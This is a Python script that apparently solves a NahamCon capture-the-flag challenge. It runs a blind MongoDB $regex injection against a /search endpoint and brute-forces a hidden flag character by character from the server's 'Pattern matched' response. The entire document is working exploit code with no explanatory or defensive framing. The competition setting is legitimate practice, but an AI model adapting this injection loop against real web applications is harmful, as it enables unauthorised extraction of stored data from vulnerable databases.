import urllib.parse
import requests
import json
from urllib.parse import quote_plus

hex_chars = "0123456789abcdef"
flag_prefix = "flag{"
flag_length = 32  # Adjust if you know the exact flag length

for i in range(len(flag_prefix), flag_length):
    for c in hex_chars:
        # Build MongoDB $regex query
        regex_pattern = f"^{flag_prefix}{c}"
        # Build query dict: flag: {$regex: "^flag{abcd"}
        query = f'flag: {{$regex: "{regex_pattern}"}}'
        # URL encode the full query string
        encoded_query = urllib.parse.quote_plus(query)
        try:
            req = requests.post(
                "http://challenge.nahamcon.com:30146/search",
                data={"query": encoded_query, "collection": "flags"}
            )
            
            if 'Pattern matched' in req.text:
                flag_prefix += c
                print(f"Found character: {c} | Current flag: {flag_prefix}")
                break
                
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")
            continue

print(f"Final flag: {flag_prefix}")